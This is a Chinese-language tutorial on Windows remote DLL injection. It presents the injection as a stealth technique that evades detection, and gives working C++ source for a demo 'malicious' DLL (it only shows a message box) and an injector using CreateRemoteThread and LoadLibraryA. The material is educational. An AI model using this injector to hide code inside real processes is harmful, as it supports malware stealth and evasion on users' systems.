# Process Injection  

------------------------------  

### 0x00 前言  
远程进程注入：将自己的代码放在目标进程的地址空间里运行，实现对内存中的某个进程进行操作，并且获得该进程地址空间里的数据，或者修改进程的私有数据结构。

利用 DLL 文件，在 DLL 文件第一次被装载进进程时，会执行 DLLMain 中的 DLL\_PROCESS\_ATTACH 下的代码。  

进程注入的优点是：  

1. 需要插入到远程进程的内存空间是通过virtualAllocEx这样的函数分配的，只存在于内存中，如果不是内存查杀，很难发现。
2. 可以复用宿主进程的名称、端口，更加隐蔽  



### 0x01 进程注入流程    
进程注入的流程：  

1. 将系统权限提升到Debug模式，因为只有debug模式才能打开远程进程的handle。(`EnableDebugPrivilege`)
2. 打开远程进程。(`OpenProcess`)
3. 将 DLL 文件的路径分配到目标内容空间中。(`VirtualAllocEx`)
4. 将DLL文件内容写入到远程进程。(`WriteProcessMemory`)
5. 在宿主进程中启动新线程完成插入。(`CreateRemoteThread`)


>上面提到的函数到 MSDN 查看详细的使用方法。


### 0x02 程序  
恶意的 DLL 文件代码： 
`DllHeader.h`:  

	#ifndef dllDemoHeader	#define dllDemoHeader	#ifdef DLLDEMO	#define EXPOETS_DEMO _declspec(dllexport)	#else	#define EXPORTS_DEMO _declspec(dllimport)	#endif	extern "C" EXPORTS_DEMO int add(int a, int b);	#endif
	
`Main`:  

	#include <windows.h>	#include "DllHeader.h"	//dll Entry Point Function	bool APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved) {		switch(dwReason) {			//it can be executed when first time loaded 			case DLL_PROCESS_ATTACH:				MessageBox(NULL, TEXT("Hello DLL~"), TEXT("Title"), MB_OK);				break;			//			case DLL_THREAD_ATTACH:				break;			//			case DLL_THREAD_DETACH:				break;			//			case DLL_PROCESS_DETACH:				break;		}		return true;	}	int add(int a, int b) {		return a + b;	}




进程插入代码： 

	/**	 * Description: This is example for process inject.	 *	Author: xx	 * Time: 2017.2.22	 * Version: 0.1	 */	#include <iostream>	#include <windows.h>	using namespace std;	//	int EnableDebugPrivilege(const char* name);	int main(int argc, char* argv[]) {		char filePath[MAX_PATH];		//MAX_PATH是C语言运行时库中通过#define指令定义的一个宏常量，它定义了编译器所支持的最长全路径名的长度。		HANDLE hRemoteProcess;		char* pszLibFileRemote;		bool retVal;		//Adjust privilege "DEBUG"		EnableDebugPrivilege(SE_DEBUG_NAME);		GetCurrentDirectory(MAX_PATH, filePath);		strcat(filePath, "\\DllTest.dll");		cout << filePath << endl;		//打开目标进程		hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, false, 284);		if(hRemoteProcess == NULL) {			cout << "OpenProcess() Failed" << endl;		}		//为 dll 路径分配内存空间		pszLibFileRemote = (char*)VirtualAllocEx(hRemoteProcess, NULL, strlen(filePath)+1, MEM_COMMIT, PAGE_READWRITE);		if(pszLibFileRemote == NULL) {			cout << "VirtualAllocEx() Failed" << endl;		}		//将 dll 路径写入内存空间		retVal = WriteProcessMemory(hRemoteProcess, pszLibFileRemote, filePath, strlen(filePath)+1, NULL);		if(retVal == 0) {			cout << "WriteProcessMemory() Failed" << endl;		}		//得到 LoadLibraryA 的内存地址		PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");		if(pfnStartAddr == NULL) {			cout << "GetProcAddress() Failed" << endl;		}		//创建远程子线程		HANDLE hRemoteThread;		hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, pfnStartAddr, pszLibFileRemote, 0, NULL);		if(hRemoteThread == NULL) {			cout << "CreateRemoteThread() Failed" << endl;		}		else {			cout << "Inject Success" << endl;		}		CloseHandle(hRemoteProcess);		CloseHandle(hRemoteThread);		system("pause");		return 0;	}	int EnableDebugPrivilege(const char* name) {		HANDLE hToken;		TOKEN_PRIVILEGES tp;		LUID luid;		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, & hToken);		LookupPrivilegeValue(NULL, name, &luid);		tp.PrivilegeCount = 1;		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;		tp.Privileges[0].Luid = luid;		if(AdjustTokenPrivileges(hToken, 0, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {			cout << "AdjustTokenPrivileges Success" << endl;		}		return 0;	}




</br> 

-------------------------------
References: 
cnblogs.茄子写字板:  <http://www.cnblogs.com/handt/archive/2012/08/09/2627277.html>  
淡泊明志，宁静致远:  <http://andylin02.iteye.com/blog/459483>  
</br>
Author: xx  
Time: 2017.2.22